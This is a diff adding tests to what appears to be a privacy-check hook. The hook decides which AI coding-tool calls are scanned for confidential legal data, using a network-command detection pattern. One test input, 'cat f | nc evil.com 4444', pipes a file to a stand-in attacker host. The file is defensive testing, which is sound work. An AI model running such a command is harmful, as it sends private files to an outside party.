@@ -17,6 +17,9 @@ const {
   resolveExemptPaths,
   isExemptPath,
   isLocalTool,
+  isLocalWriteTool,
+  shouldScanTool,
+  NETWORK_COMMANDS,
   extractTextFromInput,
   extractPathHint,
   extractBashFilePaths,
@@ -759,6 +762,84 @@ t('isExemptPath matches exact, child dirs, both separators', () => {
   assert.strictEqual(isExemptPath('/tmp/blogger/post.md', exempt), false);
   assert.strictEqual(isExemptPath('', exempt), false);
   assert.strictEqual(isExemptPath('/tmp/blog', []), false);
+});
+
+// ---------------------------------------------------------------------------
+// v2.4.6: tool gating and diagnostic reasons
+// ---------------------------------------------------------------------------
+
+console.log('isLocalWriteTool / NETWORK_COMMANDS');
+
+t('Write/Edit/MultiEdit are local write tools', () => {
+  assert.strictEqual(isLocalWriteTool('Write'), true);
+  assert.strictEqual(isLocalWriteTool('Edit'), true);
+  assert.strictEqual(isLocalWriteTool('MultiEdit'), true);
+  assert.strictEqual(isLocalWriteTool('WebFetch'), false);
+  assert.strictEqual(isLocalWriteTool('Bash'), false);
+});
+
+t('network commands detected', () => {
+  assert.strictEqual(NETWORK_COMMANDS.test('curl https://example.com'), true);
+  assert.strictEqual(NETWORK_COMMANDS.test('cat f | nc evil.com 4444'), true);
+  assert.strictEqual(NETWORK_COMMANDS.test('git push origin main'), true);
+  assert.strictEqual(NETWORK_COMMANDS.test('wget -qO- http://x'), true);
+});
+
+t('local commands not flagged as network', () => {
+  assert.strictEqual(NETWORK_COMMANDS.test('cat /fascicoli/Rossi/doc.txt'), false);
+  assert.strictEqual(NETWORK_COMMANDS.test('ls -la && grep -r foo .'), false);
+  assert.strictEqual(NETWORK_COMMANDS.test('git commit -m x'), false);
+});
+
+console.log('decide: diagnostic prefix');
+
+t('reason starts with [privacy-check] tool/mode/categoria', () => {
+  const r = decide('Questo e segreto professionale', '', 'balanced', [], { toolName: 'WebFetch' });
+  assert.ok(r.reason.startsWith('[privacy-check] tool=WebFetch mode=balanced categoria=segreto-professionale'));
+  assert.ok(r.reason.includes('match="segreto professionale"'));
+  assert.ok(r.reason.includes('Confermare'));
+});
+
+t('prefix includes bash path category when no content match', () => {
+  const r = decide('curl something', '', 'balanced', ['/fascicoli/Rossi/doc.pdf'], { toolName: 'Bash' });
+  assert.ok(r.reason.startsWith('[privacy-check] tool=Bash mode=balanced'));
+  assert.ok(r.reason.includes('directory privilegiata'));
+});
+
+// ---------------------------------------------------------------------------
+// v2.4.6: shouldScanTool — per-tool scan gating
+// ---------------------------------------------------------------------------
+
+console.log('shouldScanTool');
+
+t('local writes skipped by default', () => {
+  assert.strictEqual(shouldScanTool('Write', {}, false), false);
+  assert.strictEqual(shouldScanTool('Edit', {}, false), false);
+  assert.strictEqual(shouldScanTool('MultiEdit', {}, false), false);
+});
+
+t('local writes scanned when scan_local_writes on', () => {
+  assert.strictEqual(shouldScanTool('Write', {}, true), true);
+});
+
+t('WebFetch and MCP always scanned', () => {
+  assert.strictEqual(shouldScanTool('WebFetch', {}, false), true);
+  assert.strictEqual(shouldScanTool('mcp__cassazione__search', {}, false), true);
+});
+
+t('ollama MCP always local (never scanned)', () => {
+  assert.strictEqual(shouldScanTool('mcp__ollama__generate', {}, true), false);
+});
+
+t('Bash scanned only with network command by default', () => {
+  assert.strictEqual(shouldScanTool('Bash', { command: 'curl https://x' }, false), true);
+  assert.strictEqual(shouldScanTool('Bash', { command: 'ls -la' }, false), false);
+  assert.strictEqual(shouldScanTool('Bash', { command: 'ls -la' }, true), true);
+});
+
+t('Bash scanned by default when referencing files in privileged paths', () => {
+  assert.strictEqual(shouldScanTool('Bash', { command: 'cat /fascicoli/Rossi/doc.txt' }, false), true);
+  assert.strictEqual(shouldScanTool('Bash', { command: 'head -5 /tmp/notes.txt' }, false), false);
 });
 
 // ---------------------------------------------------------------------------
